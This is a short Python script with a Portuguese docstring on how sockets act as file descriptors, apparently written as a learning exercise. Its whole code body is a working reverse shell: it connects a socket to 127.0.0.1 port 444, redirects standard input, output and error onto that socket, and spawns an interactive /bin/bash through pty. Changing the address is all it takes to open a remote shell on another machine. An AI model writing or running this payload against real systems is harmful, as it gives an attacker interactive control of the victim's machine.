"""
    File descriptor nada mais é que o retorno de um número inteiro 
    no qual representa um arquivo aberto no kernel, e os sockets 
    se comportam como se fosse um arquivo aberto

"""

import socket
import subprocess
import os
import pty

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("127.0.0.1",444))

os.dup2(s.fileno(),0)   # File Descriptor de entrada
os.dup2(s.fileno(),1)   # File Descriptor de saída 
os.dup2(s.fileno(),2)   # File Descriptor de erro

pty.spawn("/bin/bash")